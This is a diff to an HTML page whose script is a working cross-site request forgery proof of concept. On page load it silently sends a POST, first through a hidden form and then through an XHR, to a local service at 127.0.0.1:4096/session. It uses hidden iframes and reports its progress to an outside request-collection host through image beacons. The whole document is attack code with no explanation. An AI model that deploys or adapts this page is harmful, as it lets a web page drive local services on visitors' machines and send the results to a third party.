@@ -1,7 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-const EXFIL = 'https://webhook.site/071c3611-058a-4ec0-a687-589cea6192db';
+const EXFIL = '1233334.free.beeceptor.com';
 function log(s){ new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }
 
 window.onload = () => {
@@ -14,14 +14,14 @@ window.onload = () => {
   document.body.appendChild(f1);
 
 
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = 'http://127.0.0.1:4096';
-  form.target = 'x';
-  form.style.display = 'none';
-  document.body.appendChild(form);
-  form.submit();
-  log('csrf-start-sent');
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://127.0.0.1:4096/session');
+xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0');
+xhr.setRequestHeader('Connection', 'close');
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate');
+xhr.send('{}');
+log('csrf-start-sent');
 
   const f2 = document.createElement('iframe');
   f2.style.display = 'none';
